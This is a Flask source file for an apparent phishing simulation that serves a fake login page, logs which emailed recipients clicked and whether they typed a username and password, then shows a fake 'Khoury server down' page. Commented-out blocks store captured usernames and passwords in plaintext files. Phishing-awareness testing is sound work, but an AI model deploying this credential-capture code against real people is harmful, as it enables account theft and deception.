from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

@app.route('/')
def login_page():
    return render_template('login_page.html')

@app.route('/log', methods=['GET', 'POST'])
def log_email():
    email = request.args.get("email")
    username = request.form.get("username")
    password = request.form.get("password")

    if email or (username and password):
        # with open("credentials.txt", "a") as file:
        #     file.write(f"Email: {email if email else 'N/A'}, Username: {username}, Password: {password}\n")
        with open("email_log.txt", "a") as file:
            file.write(f"Email clicked: {email}"
                       f" - Username Entered: {'Yes' if username else 'No'} "
                       f"- Password Entered: {'Yes' if password else 'No'}\n")

    return redirect(url_for('server_down'))

@app.route('/server-down')
def server_down():
    return render_template('khoury_server_down.html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)



# from flask import Flask, render_template, request, redirect, url_for
# app = Flask(__name__)
# 
# # @app.route('/log', methods=['POST'])
# # def log_credentials():
# #     username = request.form.get('username')
# #     password = request.form.get('password')
# #
# #     with open("credentials.txt", "a") as f:
# #         f.write(f"Username:{username}, Password:{password}\n")
# #
# #     return redirect(url_for('server_down'))
# 
# @app.route('/')
# def login_page():
#     return render_template('login_page.html')
# 
# @app.route('/log', methods=['GET'])
# def log_email():
#     email = request.args.get("email")
#     username = request.args.get("username")
#     password = request.args.get("password")
# 
#     if email:
#         with open("email_log.txt", "a") as file:
#             # file.write(f"Email clicked: {email}"
#             #            f" - Username Entered: {'Yes' if username else 'No'} "
#             #            f"- Password Entered: {'Yes' if password else 'No'}\n")
#             file.write(f"Email clicked: {email}, Username entered: {username}, Password entered: {password}\n")
# 
#     return redirect(url_for('server_down'))
# 
# @app.route('/server-down')
# def server_down():
#     return render_template('khoury_server_down.html')
# 
# if __name__ == "__main__":
#     app.run(host="0.0.0.0", port=8080, debug=True)
# 
